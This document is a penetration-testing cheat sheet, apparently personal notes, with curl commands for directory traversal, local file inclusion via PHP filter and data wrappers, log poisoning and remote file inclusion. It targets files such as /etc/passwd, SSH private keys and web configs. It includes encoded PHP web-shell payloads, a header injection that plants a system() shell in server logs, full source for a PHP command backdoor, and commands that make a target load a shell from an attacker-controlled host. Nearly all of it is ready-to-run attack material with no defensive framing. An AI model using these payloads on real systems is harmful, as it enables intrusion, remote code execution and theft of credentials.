# Basic Directory traversal
```bash
curl http://192.168.196.245/cgi-bin/../../../.././../../etc/passwd
curl http://192.168.196.245/index.php?page=../../../.././../../etc/passwd
curl http://192.168.196.245/index.php?page=../../../.././../..\Windows\System32\drivers\etc\hosts
curl http://houston01.skylark.com/download?filename=/../../../../../../../../../inetpub/wwwroot/appsettings.json&token=abc

> Interesting files
C:\inetpub\wwwroot\web.config
/home/user/.ssh/id_rsa
/home/user/.ssh/id_ecdsa
```
-----------------------

# Escaping Traversal
```bash
curl -path-as-is -d "echo Content-Type: text/plain; echo; whoami" "http://192.168.196.245:80/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
curl -path-as-is http://<ip>:<port>/../../../../../../../etc/passwd
```

-----------------------

# php filters with LFI
```bash
curl http://192.168.193.16/meteor/index.php?page=php://filter/convert.base64-encode/resource=../../../../../../../var/www/html/backup.php
curl http://192.168.193.16/meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?>"

>Encoded
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```

-----------------------

# Log poisoning

Check log access
```bash
curl http://<IP>/index.php?page=../../../../var/log/apache2/access.log
curl http://<IP>/index.php?page=../../../..\xampp\apache\logs\access.log
```

Inject header
```bash
curl -A "Mozilla/5.0 <?php echo system($_GET['cmd']); ?>" http://meteor.com/meteor/index.php?page=admin.php
```

Get logs with command
```bash
curl http://<IP>/index.php?page=../../../../var/log/apache2/access.log&cmd=ls%20-la
```

-----------------------

# Remote File Inclusion

Simple backdoor
```bash
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

While serving the file via http server
```bash
curl "http://<IP>/index.php?page=http://<MY-IP>/simple-backdoor.php&cmd=ls"
```

-----------------------

# Uploaded RFI
```bash
cd /dev/shm/
wget http://kali/shell.php

curl http://localhost:8000/backend/?view=../../../../../../../../../dev/shm/shell.php
```
